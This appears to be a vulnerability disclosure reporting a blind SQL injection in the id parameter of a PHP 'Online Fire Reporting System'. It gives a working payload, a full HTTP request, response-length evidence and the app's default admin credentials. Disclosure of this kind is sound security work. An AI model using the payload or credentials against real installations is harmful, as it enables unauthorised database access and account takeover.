# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/?page=teams/manage_team&id=

Vulnerability location: /ofrs/admin/?page=teams/manage_team&id=, id

Current database name: ofrs_db,length is 7

[+] Payload: /ofrs/admin/?page=teams/manage_team&id=2%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /ofrs/admin/?page=teams/manage_team&id=2%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 30064
![image](https://user-images.githubusercontent.com/54017627/170817163-af04ba14-5ec6-447d-99fc-2ce97b54d794.png)

![image](https://user-images.githubusercontent.com/54017627/170817185-1c39f8d0-56e9-460f-92ec-3d83068747b9.png)

When length (database ()) = 7, Content-Length: 30146
![image](https://user-images.githubusercontent.com/54017627/170817152-35a54a6b-3388-4df5-803b-9591772240c1.png)

![image](https://user-images.githubusercontent.com/54017627/170817175-42630d0f-8ae0-4afb-855d-b01c737fb1ce.png)
